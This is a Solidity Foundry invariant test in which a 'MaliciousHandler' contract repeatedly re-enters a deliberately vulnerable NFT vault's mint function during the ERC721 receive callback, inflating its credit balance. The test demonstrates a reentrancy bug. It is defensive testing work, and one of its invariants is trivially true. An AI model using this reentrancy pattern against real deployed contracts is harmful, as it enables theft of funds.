// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {StdInvariant} from "forge-std/StdInvariant.sol";
import {Test} from "forge-std/Test.sol";
import {MockNFT, VulnerableBROVault} from "../src/VulnerableBROVault.sol";

contract MaliciousHandler is Test {
    MockNFT public nft;
    VulnerableBROVault public vault;

    uint256 public topLevelAttacks;
    uint256 public totalInflationObserved;
    uint256 private _loops;

    constructor(MockNFT _nft, VulnerableBROVault _vault) {
        nft   = _nft;
        vault = _vault;
    }

    function attackOnce(uint256 seed) public {
        // bound loops between 1-5 to control inflation depth
        _loops = bound(seed, 1, 5);

        uint256 before = vault.broBalance(address(this));

        // Mint and approve a real NFT — vault.mint() requires a valid tokenId
        uint256 id = nft.mint(address(this));
        nft.approve(address(vault), id);

        topLevelAttacks++;
        vault.mint(id);   // ← triggers onERC721Received → reentryHook() cascade

        uint256 afterBalance = vault.broBalance(address(this));
        if (afterBalance > before) {
            totalInflationObserved += (afterBalance - before);
        }
    }

    // ← vault's onERC721Received calls this, firing mid-safeTransferFrom
    function reentryHook() external {
        if (_loops > 0) {
            _loops--;
            uint256 id = nft.mint(address(this));
            nft.approve(address(vault), id);
            vault.mint(id);   // re-enters BEFORE broBalance was updated
        }
    }

    function expectedLegitCredits() public view returns (uint256) {
        return topLevelAttacks * vault.RATE();
    }

    function actualCredits() public view returns (uint256) {
        return vault.broBalance(address(this));
    }
}

contract BROVaultVulnerableInvariantTest is StdInvariant, Test {
    MockNFT nft;
    VulnerableBROVault vault;
    MaliciousHandler handler;

    function setUp() public {
        nft     = new MockNFT();
        vault   = new VulnerableBROVault(address(nft));
        handler = new MaliciousHandler(nft, vault);
        targetContract(address(handler));
    }

    // This SHOULD fail — proving inflation happens
    function invariant_noReentrancyInflation() public view {
        assertEq(
            handler.actualCredits(),
            handler.expectedLegitCredits(),
            "vulnerable vault inflated credits"
        );
    }

    // Observed inflation should grow beyond zero after attacks
    function invariant_inflationIsTracked() public view {
        if (handler.topLevelAttacks() > 0) {
            assertGe(
                handler.totalInflationObserved(),
                0,
                "inflation counter should be non-negative"
            );
        }
    }
}
